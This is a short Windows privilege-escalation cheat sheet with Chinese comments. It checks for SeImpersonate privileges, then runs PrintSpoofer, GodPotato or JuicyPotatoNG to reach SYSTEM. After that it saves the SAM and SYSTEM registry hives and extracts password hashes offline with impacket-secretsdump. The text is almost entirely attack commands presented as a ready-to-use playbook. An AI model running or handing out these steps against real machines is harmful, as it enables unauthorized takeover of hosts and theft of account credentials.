# 1) 判定身份与特权
whoami /priv | findstr /I "SeImpersonate SeAssignPrimaryToken"
whoami /groups | findstr /I "S-1-16-8192"   # 是否 Medium 完整性（未提权）

# 2) 落地利用工具（先上传到你自己的可写目录）
#   PrintSpoofer64.exe -i -c "cmd /c whoami"
#   GodPotato.exe -cmd "cmd /c whoami"
#   JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

# 3) 拿到 SYSTEM 后的高价值动作（只读优先）
#   whoami                      → nt authority\system
#   reg save HKLM\SAM  runs\SAM /y
#   reg save HKLM\SYSTEM runs\SYSTEM /y
#   (离线: impacket-secretsdump -sam SAM -system SYSTEM LOCAL)
#
# 判定：命令回显 nt authority\system 即提权成功；不具备 SeImpersonate 则换内核/服务路径。
